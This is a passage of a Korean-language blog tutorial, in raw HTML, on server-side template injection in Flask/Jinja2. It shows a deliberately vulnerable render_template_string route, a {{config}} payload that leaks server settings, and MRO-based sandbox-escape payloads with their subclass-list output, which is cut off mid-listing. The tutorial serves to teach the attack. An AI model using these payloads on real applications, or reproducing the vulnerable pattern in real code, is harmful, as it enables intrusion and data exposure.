9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSTI Server Side Template Injection Overview</h1>\n<ul>\n<li>웹 애플리케이션에 동적인 내용을 HTML로 출력할 때 미리 정의한 Template에 동적인 값을 넣어서 출력하는 Template engine을 이용합니다.</li>\n<li>대부분의 Template Engine 에서 <code class=\"language-text\">{{2*3}}</code>, <code class=\"language-text\">${2*3}</code> 과 같은 문법을 지원합니다.</li>\n<li>만약에 Template 내부에서 사용되는 Context가 아닌 Template Source에서 사용자 입력이 들어가게된다면 악의적인 입력을 통해 개발자가 의도하지 않은 임의의 Template 기능을 실행할 수 있게 됩니다.</li>\n<li>사용자의 입력 데이터가 Template에 직접 사용될 경우 Template Engine이 해석하여 실행하는 문법을 사용할 수 있기 때문에 SSTI가 발생합니다</li>\n</ul>\n<h1 id=\"server-side-template-injection-취약점\" style=\"position:relative;\"><a href=\"#server-side-template-injection-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"server side template injection 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Server Side Template Injection 취약점</h1>\n<h3 id=\"server-side-template-injection-example\" style=\"position:relative;\"><a href=\"#server-side-template-injection-example\" aria-label=\"server side template injection example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Server Side Template Injection Example</h3>\n<ul>\n<li>Python Flask의 경우 Jinja2 Template Engine을 사용하며 아래와 같이 <code class=\"language-text\">render_template_string</code> API를 통해 해당 템플린 코드가 해석되어 클라이언트에 렌더링되어집니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tuser <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'user'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> user<span class=\"token punctuation\">:</span>\n\t\tuser <span class=\"token operator\">=</span> <span class=\"token string\">'guest'</span>\n\tt_plate <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''&lt;h1>So Good! %s'''</span><span class=\"token operator\">%</span>user\n\t<span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>t_plate<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>jinja2 템플릿 문법은 다음과 같이 사용이 되며 <code class=\"language-text\">{{code}}</code> code는 Python 문법으로 사용하시면 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> Code <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> <span class=\"token number\">7</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>Rendering<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token number\">49</span></code></pre></div>\n<ul>\n<li>내부 적으로 Python이 처리되면서 <code class=\"language-text\">built_in function</code>이 동작이 수행됩니다.</li>\n<li>다음 <code class=\"language-text\">config</code> 는 애플리케이션 설정이 담긴 변수이며 출력하게 될시 서버의 다양한 정보를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>config<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token comment\"># 애플리케이션 설정 값이 담긴 변수 </span>\n\n<span class=\"token operator\">=</span> Rendering <span class=\"token operator\">=</span>\n <span class=\"token operator\">&lt;</span>Config <span class=\"token punctuation\">{</span><span class=\"token string\">'JSON_AS_ASCII'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'USE_X_SENDFILE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_SECURE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_PATH'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_DOMAIN'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_NAME'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'session'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'MAX_COOKIE_SIZE'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">4093</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_SAMESITE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PROPAGATE_EXCEPTIONS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'ENV'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'production'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'DEBUG'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'EXPLAIN_TEMPLATE_LOADING'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'MAX_CONTENT_LENGTH'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'APPLICATION_ROOT'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SERVER_NAME'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PREFERRED_URL_SCHEME'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'http'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSONIFY_PRETTYPRINT_REGULAR'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TESTING'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PERMANENT_SESSION_LIFETIME'</span><span class=\"token punctuation\">:</span> datetime<span class=\"token punctuation\">.</span>timedelta<span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TEMPLATES_AUTO_RELOAD'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TRAP_BAD_REQUEST_ERRORS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSON_SORT_KEYS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSONIFY_MIMETYPE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'application/json'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_HTTPONLY'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SEND_FILE_MAX_AGE_DEFAULT'</span><span class=\"token punctuation\">:</span> datetime<span class=\"token punctuation\">.</span>timedelta<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PRESERVE_CONTEXT_ON_EXCEPTION'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_REFRESH_EACH_REQUEST'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TRAP_HTTP_EXCEPTIONS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">}</span><span class=\"token operator\">></span> !!!</code></pre></div>\n<h3 id=\"ssti-sandbox-escape\" style=\"position:relative;\"><a href=\"#ssti-sandbox-escape\" aria-label=\"ssti sandbox escape permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSTI Sandbox Escape</h3>\n<ul>\n<li>대상 서버 환경에서 파일 읽기 및 시스템 함수를 호출하기 위해서는 SandBox를 탈출해야 합니다.</li>\n<li><code class=\"language-text\">open('/etc/passwd', 'rb').read()</code> 형태로 사용이 불가능 합니다.</li>\n<li>SandBox 탈출하기 위해서는 MRO를 이용하여 사용할 수 있는 클래스를 찾아야 합니다.</li>\n</ul>\n<p>Method Resolution Order (<strong>MRO)?</strong></p>\n<ul>\n<li>python 클래스 계층 구조에서 메서드를 찾는 순서 입니다.</li>\n<li>현재 클래스와 연관된 모든 클래스를 확인할 수 있습니다.</li>\n</ul>\n<p><strong>SSTI MRO</strong></p>\n<ul>\n<li>호출을 하게 되면 <code class=\"language-text\">&lt;type 'str'></code>, <code class=\"language-text\">&lt;type 'basestring'></code>, <code class=\"language-text\">&lt;type 'object'></code> 3가지 가 출력됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>그중에서 object class로 들어가서 서브 클래스를 출력하고 싶다면 다음과 같이 object의 서브 클래스들을 출력하면 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>\n<p><strong>response</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'type'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakref'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakcallableproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'int'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'basestring'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'bytearray'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'list'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'NoneType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'NotImplementedType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'traceback'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'super'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'xrange'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'set'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'slice'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'staticmethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'complex'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'float'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'buffer'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'long'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'frozenset'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'property'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'memoryview'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'tuple'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'enumerate'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'reversed'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'code'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'frame'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'builtin_function_or_method'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'instancemethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'function'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'classobj'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dictproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'generator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'getset_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'wrapper_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'instance'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'ellipsis'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'member_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'file'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'PyCapsule'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cell'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'callable-iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.long_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.float_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'EncodingMap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'fieldnameiterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'formatteriterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.version_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.flags'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'exceptions.BaseException'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'module'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'imp.NullImporter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'zipimport.zipimporter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'posix.stat_result'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'posix.statvfs_result'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'warnings.WarningMessage'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'warnings.catch_warnings'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_weakrefset._IterationGuard'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_weakrefset.WeakSet'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Hashable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'classmethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Iterable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Sized'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Container'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Callable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_keys'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_items'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_values'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site._Printer'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site._Helper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Pattern'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Match'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Scanner'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site.Quitter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'codecs.IncrementalEncoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'codecs.IncrementalDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'string.Template'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'string.Formatter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'collections.deque'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'deque_iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'deque_reverse_iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.itemgetter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.attrgetter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.methodcaller'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.combinations'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.combinations_with_replacement'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.cycle'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token 